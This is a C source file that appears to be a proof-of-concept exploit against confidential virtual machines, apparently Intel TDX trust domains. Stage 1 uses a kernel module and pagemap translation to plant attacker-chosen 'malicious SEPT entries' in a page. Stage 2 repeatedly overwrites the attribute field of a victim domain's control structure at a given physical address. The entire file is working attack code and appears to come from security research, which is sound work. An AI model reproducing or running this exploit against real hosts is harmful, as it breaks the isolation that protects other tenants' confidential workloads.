#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <inttypes.h>

#include <sys/mman.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include <fcntl.h>


#define _XOPEN_SOURCE 700
#include <fcntl.h>
#include <stdint.h>

#include "readalias.h"
#include "helpers.h"

#define PAGE_SHIFT 12
#define ALLOC_SIZE 1*PAGE_SIZE
#define CL_SIZE 64

typedef union td_param_attributes_s {
    struct
    {
        uint64_t debug           : 1;   // Bit 0
        uint64_t reserved_tud    : 3;   // Bits 3:1
        uint64_t reserved_tup    : 2;   // Bits 5:4
        uint64_t pmt_prof        : 1;   // Bits 6
        uint64_t reserved_tup2   : 9;   // Bits 15:7
        uint64_t icssd           : 1;   // Bit 16
        uint64_t reserved_p      : 6;   // Bits 22:17
        uint64_t reserved_n      : 4;   // Bits 26:23
        uint64_t lass            : 1;   // Bit 27
        uint64_t sept_ve_disable : 1;   // Bit 28 - disable #VE on pending page access
        uint64_t migratable      : 1;   // Bit 29
        uint64_t pks             : 1;   // Bit 30
        uint64_t kl              : 1;   // Bit 31
        uint64_t reserved_other  : 30;  // Bits 62:32
        uint64_t tpa             : 1;   // Bit 62
        uint64_t perfmon         : 1;   // Bit 63
    };
    uint64_t raw;
} td_param_attributes_t;

typedef struct {
    uint64_t pfn : 55;
    unsigned int soft_dirty : 1;
    unsigned int file_page : 1;
    unsigned int swapped : 1;
    unsigned int present : 1;
} PagemapEntry;

/* Parse the pagemap entry for the given virtual address.
 *
 * @param[out] entry      the parsed entry
 * @param[in]  pagemap_fd file descriptor to an open /proc/pid/pagemap file
 * @param[in]  vaddr      virtual address to get entry for
 * @return 0 for success, 1 for failure
 */
int pagemap_get_entry(PagemapEntry *entry, int pagemap_fd, uintptr_t vaddr)
{
    size_t nread;
    ssize_t ret;
    uint64_t data;
    uintptr_t vpn;

    vpn = vaddr / sysconf(_SC_PAGE_SIZE);
    nread = 0;
    while (nread < sizeof(data)) {
        ret = pread(pagemap_fd, ((uint8_t*)&data) + nread, sizeof(data) - nread,
                vpn * sizeof(data) + nread);
        nread += ret;
        if (ret <= 0) {
            return 1;
        }
    }
    entry->pfn = data & (((uint64_t)1 << 55) - 1);
    entry->soft_dirty = (data >> 55) & 1;
    entry->file_page = (data >> 61) & 1;
    entry->swapped = (data >> 62) & 1;
    entry->present = (data >> 63) & 1;
    return 0;
}


int virt_to_phys_user(uintptr_t *paddr, pid_t pid, uintptr_t vaddr)
{
    char pagemap_file[BUFSIZ];
    int pagemap_fd;

    snprintf(pagemap_file, sizeof(pagemap_file), "/proc/%ju/pagemap", (uintmax_t)pid);
    pagemap_fd = open(pagemap_file, O_RDONLY);
    if (pagemap_fd < 0) {
        close(pagemap_fd);
        return 1;
    }
    PagemapEntry entry;
    if (pagemap_get_entry(&entry, pagemap_fd, vaddr)) {
        close(pagemap_fd);
        return 1;
    }
    if( entry.pfn == 0) {
        printf("%s:%d entry.pfn == 0 for pid=%d, vaddr=0x%jx, are we root?\n",__FILE__,__LINE__, pid, vaddr);
        close(pagemap_fd);
        return 1;
    }
    close(pagemap_fd);
    *paddr = (entry.pfn * sysconf(_SC_PAGE_SIZE)) + (vaddr % sysconf(_SC_PAGE_SIZE));

    return 0;
}

typedef struct
{
    char *name;
    uint64_t vaddr;
} code_gadget_t;

void hexdump(uint8_t* a, const size_t n)
{
	for(size_t i = 0; i < n; i++) {
    if (a[i]) printf("\x1b[31m%02x \x1b[0m", a[i]);
    else printf("%02x ", a[i]);
    if (i % 32 == 31) printf("\n");
  }
	printf("\n");
}

void fill_uint64(uint64_t *dest, uint64_t value, size_t count) {
    for (size_t i = 0; i < count; i++) {
        dest[i] = value;
    }
}

int main(int argc, char **argv)
{
    (void)argc;
    (void)argv;

    unsigned char* buf = NULL;
    buf = (unsigned char*)malloc(ALLOC_SIZE);
    if (!buf) goto error;
    page_stats_t stats;

    printf("Opening driver\n");
    if (open_kmod()) {
        printf("Unable to open the kernel module (are you root?)\n");
        goto error;
    }

    // Stage 1: Preparing malicious SEPT entries

    uint64_t *mem_buffer = (uint64_t *)mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    if (mem_buffer == MAP_FAILED) {
        perror("mmap");
        exit(EXIT_FAILURE);
    }
    memset(mem_buffer, 0, 4096);
    code_gadget_t gadgets[] = {
        {
            .name = "mem_buffer",
            .vaddr = (uint64_t)mem_buffer,
        },
    };

    pid_t pid = getpid();
    for (size_t i = 0; i < sizeof(gadgets) / sizeof(gadgets[0]); i++) {
        code_gadget_t *g = gadgets + i;
        uint64_t paddr;
        if (virt_to_phys_user(&paddr, pid, g->vaddr)) {
            printf("Failed to translate vaddr 0x%jx of gadget %s to paddr\n", g->vaddr, g->name);
            return -1;
        }
        printf("Allocated memory buffer of 4096 bytes\n");
        printf(" --> Guest virtual address:  0x%jx\n", g->vaddr);
        printf(" --> Guest physical address: 0x%jx\n", paddr);
    }


    char inputbuffer[128];
    char *endptr;
    uint64_t sept_entry = 0;
    printf("Enter SEPT entry: ");

    if (fgets(inputbuffer, sizeof(inputbuffer), stdin)) {
        sept_entry = (uint64_t)strtoull(inputbuffer, &endptr, 0);

        if (inputbuffer == endptr) {
            printf("Error: No valid input detected.\n");
            return -1;
        } 
    }

    fill_uint64(mem_buffer, sept_entry, 512);



    printf("\nBuffer initialized with dummy EPT entry:\n");
    hexdump((uint8_t*)mem_buffer, 128);


    printf("\nRelocate page, then press enter\n");
    getchar();

    // Stage 2: Overwriting victim TDCS

    uint64_t tdcs_pa = 0;
    printf("Enter GPA mapped to victim TDCS: ");

    if (fgets(inputbuffer, sizeof(inputbuffer), stdin)) {
        tdcs_pa = (uint64_t)strtoull(inputbuffer, &endptr, 0);

        if (inputbuffer == endptr) {
            printf("Error: No valid input detected.\n");
            return -1;
        }
    }

    printf("\nModifying TDCS at GPA=0x%lx\n\n", tdcs_pa);

    td_param_attributes_t fake_attrs;
    fake_attrs.raw = 0;
    td_param_attributes_t original_attrs;

    while (1) {
        // Now read this data from the memory location
        memset(buf, 0, ALLOC_SIZE);
        if( memcpy_frompa(&(original_attrs.raw), tdcs_pa, sizeof(td_param_attributes_t), &stats, true) ) {
            goto error;
        }

        printf("Read (encrypted) TDCS Attributes (%zu bytes):\n", sizeof(td_param_attributes_t));
        hexdump((uint8_t *)&(original_attrs.raw), sizeof(td_param_attributes_t));

        fake_attrs.raw++;

        printf("Writing to TDCS Attributes (%zu bytes):\n", sizeof(td_param_attributes_t));
        hexdump((uint8_t *)&(fake_attrs.raw), sizeof(td_param_attributes_t));

        if( memcpy_topa(tdcs_pa, &(fake_attrs.raw), sizeof(td_param_attributes_t), &stats, true) ) {
            goto error;
        }

        printf("Press enter to retry, or 'q' to quit ");

        if (fgets(inputbuffer, sizeof(inputbuffer), stdin) == NULL) {
            break; // Handle EOF
        }


        printf("Restoring original TDCS attributes\n\n");
        if( memcpy_topa(tdcs_pa, &(original_attrs.raw), sizeof(td_param_attributes_t), &stats, true) ) {
            goto error;
        }

        if (inputbuffer[0] == '\n') {
            printf("Continuing to next iteration...\n\n");
            continue;
        } else {
            printf("Exiting.\n");
            break;
        }
    }

    goto cleanup;
error:
    printf("Error -- ");
cleanup:
    if (buf) free(buf);
    printf("Closing driver\n");
    close_kmod();
}
